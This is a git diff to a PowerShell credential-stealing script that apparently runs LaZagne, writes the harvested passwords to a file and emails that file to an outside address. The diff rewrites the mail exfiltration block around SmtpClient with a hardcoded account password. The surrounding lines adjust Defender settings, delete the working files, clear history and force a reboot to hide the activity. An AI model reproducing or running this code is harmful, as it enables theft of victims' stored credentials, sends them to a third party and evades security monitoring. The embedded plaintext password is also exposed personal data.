@@ -98,19 +98,28 @@ Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download
 #POST REQUEST
 #Invoke-WebRequest -Uri "http://IP:PORT0" -Method POST -Body Get-Content "$dir\output.txt"
 
-#Mail Exfiltration
-$smtp = "smtp.office365.com"
-$From = "herbertvolkers@outlook.com"
-$To = "herbertswindel@outlook.com"
-$smtp = "smtp.office365.com"
-$Subject = "Hier zijn uw gegevens kameraad"
-$Body = "kijk maar"
+# Mail Exfiltration
+$EmailFrom = "HerbertSwindel@outlook.com"
+$EmailTo = "herbertswindel@gmail.com"
+$Subject = "Test"
+$Body = "Tricknology Test"
+$SMTPServer = "smtp.outlook.com"
 
-# The password is an app-specific password if you have 2-factor-auth enabled
-$Password = "HerbertdePervert69" | ConvertTo-SecureString -AsPlainText -Force
-$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $From, $Password
-# The smtp server used to send the file
-Send-MailMessage -From $From -To $To -Subject $Subject -Body $Body -Attachments "$dir\output.txt" -SmtpServer $smtp -port 587 -UseSsl -Credential $Credential
+$SMTPClient = New-Object Net.Mail.SmtpClient($SMTPServer, 587)
+$SMTPClient.EnableSsl = $true
+$SMTPClient.Credentials = New-Object System.Net.NetworkCredential("HerbertSwindel@outlook.com", "HerbertdePervert69")
+
+# Send the email with attachment
+$Attachment = "$dir\output.txt"
+$Message = New-Object Net.Mail.MailMessage($EmailFrom, $EmailTo, $Subject, $Body)
+$Message.Attachments.Add($Attachment)
+
+try {
+    $SMTPClient.Send($Message)
+    Write-Host "Email sent successfully."
+} catch {
+    Write-Host "Failed to send email. Error: $($_.Exception.Message)"
+}
 
 # Clean up
 Remove-Item -Path $dir -Recurse -Force
@@ -118,6 +127,10 @@ Set-MpPreference -DisableRealtimeMonitoring $false
 Remove-MpPreference -ExclusionPath $dir
 
 # Remove the script from the system
+Clear-History
+
+# Reboot the system
+Restart-Computer -Force
 Clear-History
 
 # Reboot the system
